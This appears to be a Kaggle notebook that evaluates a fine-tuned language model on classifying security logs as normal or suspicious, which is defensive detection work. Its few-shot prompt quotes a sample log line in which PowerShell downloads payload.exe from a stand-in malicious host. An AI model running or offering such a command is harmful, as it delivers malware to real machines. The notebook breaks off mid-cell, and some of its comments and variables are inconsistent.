{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "_cell_guid": "b1076dfc-b9ad-4769-8c92-a6c4dae69d19",
    "_uuid": "8f2839f25d086af736a60e9eeb907d3b93b6e0e5",
    "execution": {
     "iopub.execute_input": "2026-01-06T16:38:48.984805Z",
     "iopub.status.busy": "2026-01-06T16:38:48.984532Z",
     "iopub.status.idle": "2026-01-06T16:38:49.207774Z",
     "shell.execute_reply": "2026-01-06T16:38:49.207105Z",
     "shell.execute_reply.started": "2026-01-06T16:38:48.984782Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Check GPU availability\n",
    "!nvidia-smi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:38:49.209521Z",
     "iopub.status.busy": "2026-01-06T16:38:49.209295Z",
     "iopub.status.idle": "2026-01-06T16:38:53.791677Z",
     "shell.execute_reply": "2026-01-06T16:38:53.790886Z",
     "shell.execute_reply.started": "2026-01-06T16:38:49.209495Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Install required packages\n",
    "print(\"üì¶ Installing dependencies...\")\n",
    "!pip install -q transformers datasets accelerate peft tqdm pandas numpy scikit-learn matplotlib seaborn\n",
    "print(\"‚úÖ Dependencies installed!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:38:53.793015Z",
     "iopub.status.busy": "2026-01-06T16:38:53.792780Z",
     "iopub.status.idle": "2026-01-06T16:38:53.822291Z",
     "shell.execute_reply": "2026-01-06T16:38:53.821591Z",
     "shell.execute_reply.started": "2026-01-06T16:38:53.792987Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Configuration\n",
    "import os\n",
    "\n",
    "# Kaggle paths - UPDATE THESE based on your uploaded dataset names\n",
    "MODEL_PATH = \"/kaggle/input/mitre-fine-tuned-model\"  # Your uploaded model dataset\n",
    "DATA_PATH = \"/kaggle/input/mitre-datset\"  # Your test data dataset\n",
    "TEST_FILE = f\"{DATA_PATH}/test.jsonl\"\n",
    "\n",
    "# Evaluation settings\n",
    "EVAL_LIMIT = 5  # FIXED: Increased from 2 to 100 for meaningful results\n",
    "MAX_NEW_TOKENS = 512  # FIXED: Increased from 256 for longer responses\n",
    "\n",
    "print(\"‚úÖ Configuration loaded\")\n",
    "print(f\"   Model: {MODEL_PATH}\")\n",
    "print(f\"   Test data: {TEST_FILE}\")\n",
    "print(f\"   Evaluation limit: {EVAL_LIMIT if EVAL_LIMIT else 'Full dataset'}\")\n",
    "\n",
    "# Verify paths exist\n",
    "if os.path.exists(MODEL_PATH):\n",
    "    print(f\"‚úÖ Model found: {len(os.listdir(MODEL_PATH))} files\")\n",
    "else:\n",
    "    print(f\"‚ùå Model not found at {MODEL_PATH}\")\n",
    "    print(\"   Please upload your fine_tuned_model as a Kaggle dataset\")\n",
    "\n",
    "if os.path.exists(TEST_FILE):\n",
    "    print(f\"‚úÖ Test file found\")\n",
    "else:\n",
    "    print(f\"‚ùå Test file not found at {TEST_FILE}\")\n",
    "    print(\"   Please add your test dataset to Kaggle\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:38:53.823501Z",
     "iopub.status.busy": "2026-01-06T16:38:53.823281Z",
     "iopub.status.idle": "2026-01-06T16:39:41.825042Z",
     "shell.execute_reply": "2026-01-06T16:39:41.824260Z",
     "shell.execute_reply.started": "2026-01-06T16:38:53.823482Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Load the fine-tuned model\n",
    "print(\"üîÑ Loading fine-tuned model...\\n\")\n",
    "\n",
    "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
    "import torch\n",
    "\n",
    "model = AutoModelForCausalLM.from_pretrained(\n",
    "    MODEL_PATH,\n",
    "    torch_dtype=torch.float16,\n",
    "    device_map=\"auto\",\n",
    "    trust_remote_code=True\n",
    ")\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(MODEL_PATH, trust_remote_code=True)\n",
    "tokenizer.pad_token = tokenizer.eos_token\n",
    "\n",
    "model.eval()  # Set to evaluation mode\n",
    "\n",
    "print(f\"‚úÖ Model loaded from: {MODEL_PATH}\")\n",
    "print(f\"üìä GPU Memory: {torch.cuda.memory_allocated() / 1024**3:.2f} GB\")\n",
    "print(f\"üìä Model device: {model.device}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:39:41.827954Z",
     "iopub.status.busy": "2026-01-06T16:39:41.827267Z",
     "iopub.status.idle": "2026-01-06T16:39:43.331432Z",
     "shell.execute_reply": "2026-01-06T16:39:43.330855Z",
     "shell.execute_reply.started": "2026-01-06T16:39:41.827926Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Load test dataset\n",
    "print(\"üîÑ Loading test dataset...\\n\")\n",
    "\n",
    "from datasets import load_dataset\n",
    "\n",
    "test_dataset = load_dataset('json', data_files={'test': TEST_FILE})['test']\n",
    "\n",
    "print(f\"‚úÖ Test dataset loaded: {len(test_dataset):,} examples\")\n",
    "print(f\"\\nüìã Dataset columns: {test_dataset.column_names}\")\n",
    "print(f\"\\nüìã Sample test entry:\")\n",
    "print(f\"   Instruction: {test_dataset[0]['instruction'][:100]}...\")\n",
    "print(f\"   Input: {test_dataset[0]['input'][:100]}...\")\n",
    "print(f\"   Output: {test_dataset[0]['output'][:100]}...\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TEST BASE MODEL WITH FEW-SHOT PROMPTING\n",
    "print(\"üîÑ Loading BASE Qwen2.5-1.5B-Instruct model (not fine-tuned)...\\n\")\n",
    "\n",
    "from transformers import AutoModelForCausalLM, AutoTokenizer\n",
    "import torch\n",
    "import re\n",
    "import json\n",
    "\n",
    "# Load the original base model\n",
    "base_model = AutoModelForCausalLM.from_pretrained(\n",
    "    \"Qwen/Qwen2.5-1.5B-Instruct\",\n",
    "    torch_dtype=torch.float16,\n",
    "    device_map=\"auto\",\n",
    "    trust_remote_code=True\n",
    ")\n",
    "\n",
    "base_tokenizer = AutoTokenizer.from_pretrained(\"Qwen/Qwen2.5-1.5B-Instruct\", trust_remote_code=True)\n",
    "base_tokenizer.pad_token = base_tokenizer.eos_token\n",
    "\n",
    "base_model.eval()\n",
    "\n",
    "print(f\"‚úÖ Base model loaded\")\n",
    "print(f\"üìä GPU Memory: {torch.cuda.memory_allocated() / 1024**3:.2f} GB\\n\")\n",
    "\n",
    "print(\"=\"*80)\n",
    "print(\"üéØ USING FEW-SHOT PROMPTING (WITH INPUT TRUNCATION)\")\n",
    "print(\"=\"*80)\n",
    "print(\"Showing the model 2 examples of the exact format we want,\")\n",
    "print(\"then asking it to classify a new log.\\n\")\n",
    "\n",
    "# Get test examples\n",
    "example = test_dataset[0]\n",
    "\n",
    "# USE FULL INPUT - NO TRUNCATION!\n",
    "input_text = example['input']\n",
    "print(f\"‚úÖ Using FULL input: {len(input_text)} chars (no truncation)\")\n",
    "\n",
    "# FEW-SHOT PROMPT: Include 2 examples before the actual test\n",
    "prompt = f\"\"\"You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.\n",
    "\n",
    "Output format:\n",
    "Status: Normal OR Status: Suspicious\n",
    "Reason: Brief explanation\n",
    "\n",
    "### Example 1:\n",
    "Input: {{\"EventID\": 4624, \"LogonType\": 2, \"Account\": \"user@domain.com\", \"Workstation\": \"DESKTOP-123\"}}\n",
    "Response:\n",
    "Status: Normal\n",
    "Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.\n",
    "\n",
    "### Example 2:\n",
    "Input: {{\"EventID\": 4688, \"Process\": \"powershell.exe\", \"CommandLine\": \"Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\\\\\temp\\\\\\\\mal.exe\", \"User\": \"SYSTEM\"}}\n",
    "Response:\n",
    "Status: Suspicious\n",
    "Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).\n",
    "\n",
    "### Now analyze this log:\n",
    "Input: {input_text}\n",
    "Response:\n",
    "\"\"\"\n",
    "\n",
    "print(f\"üìä FULL PROMPT LENGTH: {len(prompt)} characters\")\n",
    "print(f\"üìã EXPECTED OUTPUT: {example['output']}\\n\")\n",
    "\n",
    "# Tokenize with increased max_length\n",
    "inputs = base_tokenizer(prompt, return_tensors=\"pt\", truncation=True, max_length=4096)\n",
    "inputs = {k: v.to(base_model.device) for k, v in inputs.items()}\n",
    "\n",
    "print(f\"üìä After tokenization: {inputs['input_ids'].shape[1]} tokens\")\n",
    "\n",
    "# Check actual token count WITHOUT truncation first\n",
    "test_tokens = base_tokenizer(prompt, return_tensors=\"pt\", truncation=False)\n",
    "actual_tokens = test_tokens['input_ids'].shape[1]\n",
    "print(f\"üìä Actual tokens needed: {actual_tokens}\")\n",
    "\n",
    "# Use appropriate max_length (4096, 8192, or 16384)\n",
    "if actual_tokens <= 4096:\n",
    "    max_len = 4096\n",
    "elif actual_tokens <= 8192:\n",
    "    max_len = 8192\n",
    "else:\n",
    "    max_len = 16384\n",
    "\n",
    "print(f\"üìä Using max_length: {max_len}\")\n",
    "\n",
    "# Tokenize with dynamic max_length\n",
    "inputs = base_tokenizer(prompt, return_tensors=\"pt\", truncation=True, max_length=max_len)\n",
    "inputs = {k: v.to(base_model.device) for k, v in inputs.items()}\n",
    "\n",
    "print(f\"üìä After tokenization: {inputs['input_ids'].shape[1]} tokens\")\n",
    "\n",
    "if inputs['input_ids'].shape[1] >= max_len:\n",
    "    print(f\"‚ö†Ô∏è WARNING: Prompt was truncated to fit {max_len} tokens!\")\n",
    "    print(f\"   Consider using larger max_length or shorter inputs\")\n",
    "else:\n",
    "    print(f\"‚úÖ No truncation - full input preserved!\")\n",
    "\n",
    "# Generate with some randomness for variety\n",
    "print(\"\\nüöÄ Generating response...\")\n",
    "with torch.no_grad():\n",
    "    outputs = base_model.generate(\n",
    "        **inputs,\n",
    "        max_new_tokens=256,\n",
    "        temperature=0.7,  # Increased for variety (was 0.1)\n",
    "        do_sample=True,   # Enable sampling for variety (was False)\n",
    "        top_p=0.9,        # Nucleus sampling\n",
    "        pad_token_id=base_tokenizer.eos_token_id\n",
    "    )\n",
    "# Decode\n",
    "generated_text = base_tokenizer.decode(outputs[0][inputs['input_ids'].shape[1]:], skip_special_tokens=True)\n",
    "\n",
    "print(f\"\\nü§ñ BASE MODEL PREDICTED:\")\n",
    "print(\"=\"*80)\n",
    "print(generated_text)\n",
    "print(\"=\"*80)\n",
    "\n",
    "print(f\"\\nüìä EXPECTED OUTPUT:\")\n",
    "print(\"=\"*80)\n",
    "print(example['output'])\n",
    "print(\"=\"*80)\n",
    "\n",
    "# Check if it matches format\n",
    "has_status = bool(re.search(r'Status:\\s*(Normal|Suspicious)', generated_text, re.IGNORECASE))\n",
    "has_reason = 'reason:' in generated_text.lower() or 'reason -' in generated_text.lower()\n",
    "\n",
    "print(f\"\\n‚úÖ Format Check:\")\n",
    "print(f\"   Contains 'Status: Normal/Suspicious': {has_status}\")\n",
    "print(f\"   Contains 'Reason': {has_reason}\")\n",
    "\n",
    "if has_status:\n",
    "    print(\"\\nüéâ SUCCESS! Base model is now outputting the correct format!\")\n",
    "    print(\"   You can now run the evaluation cells to test on more examples.\")\n",
    "else:\n",
    "    print(\"\\n‚ö†Ô∏è Model output doesn't match format.\")\n",
    "    print(\"   Likely cause: Input was truncated, model didn't see examples or '### Response:' marker\")\n",
    "\n",
    "print(f\"\\nüí° WHY OUTPUT WAS CONSISTENT BEFORE:\")\n",
    "print(f\"   - do_sample=False (greedy decoding) = always picks most likely token\")\n",
    "print(f\"   - temperature=0.1 (very low) = minimal randomness\")\n",
    "print(f\"   - Truncated input at same point = same output every time\")\n",
    "print(f\"\\n   NOW USING: do_sample=True, temperature=0.7 for variety\")\n",
    "\n",
    "# Clean up to free memory\n",
    "del base_model\n",
    "del base_tokenizer\n",
    "torch.cuda.empty_cache()\n",
    "print(\"\\n‚úÖ Base model unloaded to free memory\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TEST FINE-TUNED MODEL WITH SAME PROMPT AND INPUT\n",
    "print(\"üîÑ Testing FINE-TUNED model with same approach as base model...\\n\")\n",
    "\n",
    "import re\n",
    "import json\n",
    "\n",
    "print(\"=\"*80)\n",
    "print(\"üéØ TESTING FINE-TUNED MODEL (WITH FEW-SHOT PROMPTING)\")\n",
    "print(\"=\"*80)\n",
    "print(\"Using the same prompt structure and full input as the base model test.\\n\")\n",
    "\n",
    "# Get the same test example\n",
    "example = test_dataset[0]\n",
    "\n",
    "# USE FULL INPUT - NO TRUNCATION!\n",
    "input_text = example['input']\n",
    "print(f\"‚úÖ Using FULL input: {len(input_text)} chars (no truncation)\")\n",
    "\n",
    "# FEW-SHOT PROMPT: Same as base model test\n",
    "prompt = f\"\"\"You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.\n",
    "\n",
    "Output format:\n",
    "Status: Normal OR Status: Suspicious\n",
    "Reason: Brief explanation\n",
    "\n",
    "### Example 1:\n",
    "Input: {{\"EventID\": 4624, \"LogonType\": 2, \"Account\": \"user@domain.com\", \"Workstation\": \"DESKTOP-123\"}}\n",
    "Response:\n",
    "Status: Normal\n",
    "Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.\n",
    "\n",
    "### Example 2:\n",
    "Input: {{\"EventID\": 4688, \"Process\": \"powershell.exe\", \"CommandLine\": \"Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\\\\\temp\\\\\\\\mal.exe\", \"User\": \"SYSTEM\"}}\n",
    "Response:\n",
    "Status: Suspicious\n",
    "Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).\n",
    "\n",
    "### Now analyze this log:\n",
    "Input: {input_text}\n",
    "Response:\n",
    "\"\"\"\n",
    "\n",
    "print(f\"üìä FULL PROMPT LENGTH: {len(prompt)} characters\")\n",
    "print(f\"üìã EXPECTED OUTPUT: {example['output']}\\n\")\n",
    "\n",
    "# Check actual token count WITHOUT truncation first\n",
    "test_tokens = tokenizer(prompt, return_tensors=\"pt\", truncation=False)\n",
    "actual_tokens = test_tokens['input_ids'].shape[1]\n",
    "print(f\"üìä Actual tokens needed: {actual_tokens}\")\n",
    "\n",
    "# Use appropriate max_length (4096, 8192, or 16384)\n",
    "if actual_tokens <= 4096:\n",
    "    max_len = 4096\n",
    "elif actual_tokens <= 8192:\n",
    "    max_len = 8192\n",
    "else:\n",
    "    max_len = 16384\n",
    "\n",
    "print(f\"üìä Using max_length: {max_len}\")\n",
    "\n",
    "# Tokenize with dynamic max_length\n",
    "inputs = tokenizer(prompt, return_tensors=\"pt\", truncation=True, max_length=max_len)\n",
    "inputs = {k: v.to(model.device) for k, v in inputs.items()}\n",
    "\n",
    "print(f\"üìä After tokenization: {inputs['input_ids'].shape[1]} tokens\")\n",
    "\n",
    "if inputs['input_ids'].shape[1] >= max_len:\n",
    "    print(f\"‚ö†Ô∏è WARNING: Prompt was truncated to fit {max_len} tokens!\")\n",
    "    print(f\"   Consider using larger max_length or shorter inputs\")\n",
    "else:\n",
    "    print(f\"‚úÖ No truncation - full input preserved!\")\n",
    "\n",
    "# Generate with same parameters as base model\n",
    "print(\"\\nüöÄ Generating response with FINE-TUNED model...\")\n",
    "with torch.no_grad():\n",
    "    outputs = model.generate(\n",
    "        **inputs,\n",
    "        max_new_tokens=256,\n",
    "        temperature=0.7,\n",
    "        do_sample=True,\n",
    "        top_p=0.9,\n",
    "        pad_token_id=tokenizer.eos_token_id\n",
    "    )\n",
    "\n",
    "# Decode\n",
    "generated_text = tokenizer.decode(outputs[0][inputs['input_ids'].shape[1]:], skip_special_tokens=True)\n",
    "\n",
    "print(f\"\\nü§ñ FINE-TUNED MODEL PREDICTED:\")\n",
    "print(\"=\"*80)\n",
    "print(generated_text)\n",
    "print(\"=\"*80)\n",
    "\n",
    "print(f\"\\nüìä EXPECTED OUTPUT:\")\n",
    "print(\"=\"*80)\n",
    "print(example['output'])\n",
    "print(\"=\"*80)\n",
    "\n",
    "# Check if it matches format\n",
    "has_status = bool(re.search(r'Status:\\s*(Normal|Suspicious)', generated_text, re.IGNORECASE))\n",
    "has_reason = 'reason:' in generated_text.lower() or 'reason -' in generated_text.lower()\n",
    "\n",
    "print(f\"\\n‚úÖ Format Check:\")\n",
    "print(f\"   Contains 'Status: Normal/Suspicious': {has_status}\")\n",
    "print(f\"   Contains 'Reason': {has_reason}\")\n",
    "\n",
    "if has_status:\n",
    "    print(\"\\nüéâ SUCCESS! Fine-tuned model is outputting the correct format!\")\n",
    "    print(\"   The model has learned the task properly.\")\n",
    "else:\n",
    "    print(\"\\n‚ö†Ô∏è Model output doesn't match expected format.\")\n",
    "    print(\"   This suggests the model needs retraining with proper parameters.\")\n",
    "    print(\"   Recommendation: Retrain with MAX_LENGTH=8192, 5 epochs\")\n",
    "\n",
    "# Compare with base model results\n",
    "print(f\"\\nüí° COMPARISON:\")\n",
    "print(f\"   Fine-tuned model was trained with MAX_LENGTH={512} (original)\")\n",
    "print(f\"   Current input needs: {actual_tokens} tokens\")\n",
    "print(f\"   If output is gibberish, model needs retraining with MAX_LENGTH=8192\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:39:43.332919Z",
     "iopub.status.busy": "2026-01-06T16:39:43.332310Z",
     "iopub.status.idle": "2026-01-06T16:39:51.441791Z",
     "shell.execute_reply": "2026-01-06T16:39:51.440951Z",
     "shell.execute_reply.started": "2026-01-06T16:39:43.332892Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Define evaluation functions with FEW-SHOT PROMPTING and INPUT TRUNCATION\n",
    "print(\"üîÑ Defining evaluation functions with few-shot prompting...\\n\")\n",
    "\n",
    "def generate_response(model, tokenizer, instruction, input_text, max_new_tokens=512):\n",
    "    \"\"\"Generate a response using few-shot prompting to guide format.\"\"\"\n",
    "    \n",
    "    # TRUNCATE INPUT IF TOO LONG\n",
    "    MAX_INPUT_CHARS = 6000  # Conservative limit to fit examples + prompt\n",
    "    \n",
    "    if len(input_text) > MAX_INPUT_CHARS:\n",
    "        input_text = input_text[:MAX_INPUT_CHARS] + \"... [truncated]\"\n",
    "    \n",
    "    # FEW-SHOT PROMPT: Include examples to guide the model\n",
    "    prompt = f\"\"\"You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.\n",
    "\n",
    "Output format:\n",
    "Status: Normal OR Status: Suspicious\n",
    "Reason: Brief explanation\n",
    "\n",
    "### Example 1:\n",
    "Input: {{\"EventID\": 4624, \"LogonType\": 2, \"Account\": \"user@domain.com\", \"Workstation\": \"DESKTOP-123\"}}\n",
    "Response:\n",
    "Status: Normal\n",
    "Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.\n",
    "\n",
    "### Example 2:\n",
    "Input: {{\"EventID\": 4688, \"Process\": \"powershell.exe\", \"CommandLine\": \"Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\\\\\temp\\\\\\\\mal.exe\", \"User\": \"SYSTEM\"}}\n",
    "Response:\n",
    "Status: Suspicious\n",
    "Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).\n",
    "\n",
    "### Now analyze this log:\n",
    "Input: {input_text}\n",
    "Response:\n",
    "\"\"\"\n",
    "    \n",
    "    # Tokenize with max_length to prevent truncation issues\n",
    "    inputs = tokenizer(prompt, return_tensors=\"pt\", truncation=True, max_length=3072)\n",
    "    inputs = {k: v.to(model.device) for k, v in inputs.items()}\n",
    "    \n",
    "    with torch.no_grad():\n",
    "        outputs = model.generate(\n",
    "            **inputs,\n",
    "            max_new_tokens=max_new_tokens,\n",
    "            temperature=0.7,  # Some randomness for variety\n",
    "            do_sample=True,   # Enable sampling\n",
    "            top_p=0.9,\n",
    "            pad_token_id=tokenizer.eos_token_id\n",
    "        )\n",
    "    \n",
    "    # Decode only the generated part (remove the prompt)\n",
    "    generated_text = tokenizer.decode(outputs[0][inputs['input_ids'].shape[1]:], skip_special_tokens=True)\n",
    "    return generated_text.strip()\n",
    "\n",
    "# FIXED: Better label extraction for status classification\n",
    "def extract_status_label(text):\n",
    "    \"\"\"Extract Normal/Suspicious/Unknown from model output\"\"\"\n",
    "    text_lower = text.lower()\n",
    "    if 'status: normal' in text_lower or 'status:normal' in text_lower:\n",
    "        return 'NORMAL'\n",
    "    elif 'status: suspicious' in text_lower or 'status:suspicious' in text_lower:\n",
    "        return 'SUSPICIOUS'\n",
    "    else:\n",
    "        return 'UNKNOWN'\n",
    "\n",
    "def extract_technique_id(text):\n",
    "    \"\"\"Extract MITRE technique ID from text (e.g., T1234, T1234.001)\"\"\"\n",
    "    import re\n",
    "    match = re.search(r'T\\d{4}(?:\\.\\d{3})?', text.upper())\n",
    "    return match.group(0) if match else None\n",
    "\n",
    "def calculate_exact_match(pred, target):\n",
    "    \"\"\"Calculate exact match accuracy.\"\"\"\n",
    "    return 1.0 if pred.strip().lower() == target.strip().lower() else 0.0\n",
    "\n",
    "def calculate_partial_match(pred, target):\n",
    "    \"\"\"Calculate partial match (keyword overlap).\"\"\"\n",
    "    pred_lower = pred.strip().lower()\n",
    "    target_lower = target.strip().lower()\n",
    "    \n",
    "    # Check if major keywords from target appear in prediction\n",
    "    target_words = set(target_lower.split())\n",
    "    pred_words = set(pred_lower.split())\n",
    "    \n",
    "    if len(target_words) == 0:\n",
    "        return 0.0\n",
    "    \n",
    "    overlap = len(target_words.intersection(pred_words))\n",
    "    return overlap / len(target_words)\n",
    "\n",
    "def calculate_f1_score(pred, target):\n",
    "    \"\"\"Calculate F1 score based on word overlap.\"\"\"\n",
    "    pred_words = set(pred.strip().lower().split())\n",
    "    target_words = set(target.strip().lower().split())\n",
    "    \n",
    "    if len(pred_words) == 0 or len(target_words) == 0:\n",
    "        return 0.0\n",
    "    \n",
    "    overlap = len(pred_words.intersection(target_words))\n",
    "    \n",
    "    precision = overlap / len(pred_words) if len(pred_words) > 0 else 0.0\n",
    "    recall = overlap / len(target_words) if len(target_words) > 0 else 0.0\n",
    "    \n",
    "    if precision + recall == 0:\n",
    "        return 0.0\n",
    "    \n",
    "    f1 = 2 * (precision * recall) / (precision + recall)\n",
    "    return f1\n",
    "\n",
    "print(\"‚úÖ Evaluation functions defined with few-shot prompting\")\n",
    "print(\"   üìä Input truncated to 6000 chars to fit within token limits\")\n",
    "print(\"   üìä max_length=3072 tokens (examples + truncated input + response)\")\n",
    "print(\"   üìä Using temperature=0.7, do_sample=True for variety\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:39:51.443285Z",
     "iopub.status.busy": "2026-01-06T16:39:51.442903Z",
     "iopub.status.idle": "2026-01-06T16:42:31.015986Z",
     "shell.execute_reply": "2026-01-06T16:42:31.015256Z",
     "shell.execute_reply.started": "2026-01-06T16:39:51.443249Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Run evaluation\n",
    "print(\"üöÄ Running evaluation on test set...\\n\")\n",
    "\n",
    "from tqdm import tqdm\n",
    "import time\n",
    "\n",
    "# Determine sample size\n",
    "if EVAL_LIMIT is None:\n",
    "    eval_samples = test_dataset\n",
    "    print(f\"Evaluating on FULL test set: {len(eval_samples):,} examples\")\n",
    "else:\n",
    "    eval_samples = test_dataset.select(range(min(EVAL_LIMIT, len(test_dataset))))\n",
    "    print(f\"Evaluating on LIMITED test set: {len(eval_samples):,} examples (out of {len(test_dataset):,})\")\n",
    "\n",
    "print(f\"This may take a while...\\n\")\n",
    "\n",
    "results = []\n",
    "exact_matches = 0\n",
    "partial_match_scores = []\n",
    "f1_scores = []\n",
    "\n",
    "start_time = time.time()\n",
    "\n",
    "for i, example in enumerate(tqdm(eval_samples, desc=\"Evaluating\")):\n",
    "    # Generate prediction\n",
    "    prediction = generate_response(\n",
    "        model,\n",
    "        tokenizer,\n",
    "        example['instruction'],\n",
    "        example['input'],\n",
    "        max_new_tokens=MAX_NEW_TOKENS\n",
    "    )\n",
    "    \n",
    "    # Calculate metrics\n",
    "    exact_match = calculate_exact_match(prediction, example['output'])\n",
    "    partial_match = calculate_partial_match(prediction, example['output'])\n",
    "    f1 = calculate_f1_score(prediction, example['output'])\n",
    "    \n",
    "    exact_matches += exact_match\n",
    "    partial_match_scores.append(partial_match)\n",
    "    f1_scores.append(f1)\n",
    "    \n",
    "    # Store result\n",
    "    results.append({\n",
    "        'index': i,\n",
    "        'instruction': example['instruction'],\n",
    "        'input': example['input'],\n",
    "        'expected': example['output'],\n",
    "        'predicted': prediction,\n",
    "        'exact_match': exact_match,\n",
    "        'partial_match': partial_match,\n",
    "        'f1_score': f1\n",
    "    })\n",
    "    \n",
    "    # Show first 10 examples (FIXED: increased from 5)\n",
    "    if i < 10:\n",
    "        print(f\"\\n{'='*80}\")\n",
    "        print(f\"Example {i+1}:\")\n",
    "        print(f\"Instruction: {example['instruction'][:80]}...\")\n",
    "        print(f\"Input: {example['input'][:80]}...\")\n",
    "        print(f\"Expected: {example['output'][:200]}...\")\n",
    "        print(f\"Predicted: {prediction[:200]}...\")\n",
    "        print(f\"Metrics: Exact={exact_match}, Partial={partial_match:.2f}, F1={f1:.2f}\")\n",
    "\n",
    "elapsed = time.time() - start_time\n",
    "\n",
    "print(f\"\\n{'='*80}\")\n",
    "print(f\"‚úÖ Evaluation completed in {elapsed/60:.2f} minutes ({elapsed/len(eval_samples):.2f} sec/example)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TOKEN USAGE STATISTICS\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"üìä TOKEN USAGE STATISTICS (FULL INPUT)\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "if token_stats:\n",
    "    import numpy as np\n",
    "    \n",
    "    actual_tokens_list = [s['actual_tokens'] for s in token_stats]\n",
    "    max_lengths_used = [s['max_length_used'] for s in token_stats]\n",
    "    truncated_count = sum(1 for s in token_stats if s['truncated'])\n",
    "    \n",
    "    print(f\"Total examples processed: {len(token_stats)}\")\n",
    "    print(f\"\\nüìà Token Count Statistics (Input + Few-shot Examples):\")\n",
    "    print(f\"   Min tokens:     {min(actual_tokens_list):,}\")\n",
    "    print(f\"   Max tokens:     {max(actual_tokens_list):,}\")\n",
    "    print(f\"   Average tokens: {np.mean(actual_tokens_list):,.0f}\")\n",
    "    print(f\"   Median tokens:  {np.median(actual_tokens_list):,.0f}\")\n",
    "    \n",
    "    print(f\"\\nüìä Max Length Distribution:\")\n",
    "    max_len_4096 = sum(1 for ml in max_lengths_used if ml == 4096)\n",
    "    max_len_8192 = sum(1 for ml in max_lengths_used if ml == 8192)\n",
    "    max_len_16384 = sum(1 for ml in max_lengths_used if ml == 16384)\n",
    "    \n",
    "    print(f\"   Used 4096:  {max_len_4096} examples ({max_len_4096/len(token_stats)*100:.1f}%)\")\n",
    "    print(f\"   Used 8192:  {max_len_8192} examples ({max_len_8192/len(token_stats)*100:.1f}%)\")\n",
    "    print(f\"   Used 16384: {max_len_16384} examples ({max_len_16384/len(token_stats)*100:.1f}%)\")\n",
    "    \n",
    "    if truncated_count > 0:\n",
    "        print(f\"\\n‚ö†Ô∏è WARNING: {truncated_count} examples were truncated!\")\n",
    "        print(f\"   Consider using an even larger max_length or shorter inputs\")\n",
    "    else:\n",
    "        print(f\"\\n‚úÖ No truncation occurred - all inputs fit within max_length limits\")\n",
    "    \n",
    "    # Recommendation for training\n",
    "    recommended_max_length = max(actual_tokens_list)\n",
    "    # Round up to next power of 2 for efficiency\n",
    "    import math\n",
    "    recommended_max_length = 2 ** math.ceil(math.log2(recommended_max_length))\n",
    "    \n",
    "    print(f\"\\nüí° RECOMMENDATION FOR TRAINING:\")\n",
    "    print(f\"   For training, use MAX_LENGTH = {recommended_max_length} to fit all examples\")\n",
    "    print(f\"   This ensures no data loss during fine-tuning\")\n",
    "else:\n",
    "    print(\"‚ö†Ô∏è No token statistics collected yet - run evaluation first!\")\n",
    "\n",
    "print(\"=\"*80)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2026-01-06T16:42:31.017254Z",
     "iopub.status.busy": "2026-01-06T16:42:31.016984Z",
     "iopub.status.idle": "2026-01-06T16:42:31.053252Z",
     "shell.execute_reply": "2026-01-06T16:42:31.052569Z",
     "shell.execute_reply.started": "2026-01-06T16:42:31.017230Z"
    },
    "trusted": true
   },
   "outputs": [],
   "source": [
    "# Calculate comprehensive metrics - FIXED VERSION\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"üìä CALCULATING COMPREHENSIVE METRICS\")\n",
    "print(\"=\"*80 + \"\\n\")\n",
    "\n",
    "import numpy as np\n",
    "from sklearn.metrics import (\n",
    "    accuracy_score, \n",
    "    precision_score, \n",
    "    recall_score, \n",
    "    f1_score, \n",
    "    confusion_matrix,\n",
    "    classification_report\n",
    ")\n",
    "import pandas as pd\n",
    "from collections import Counter\n",
    "\n",
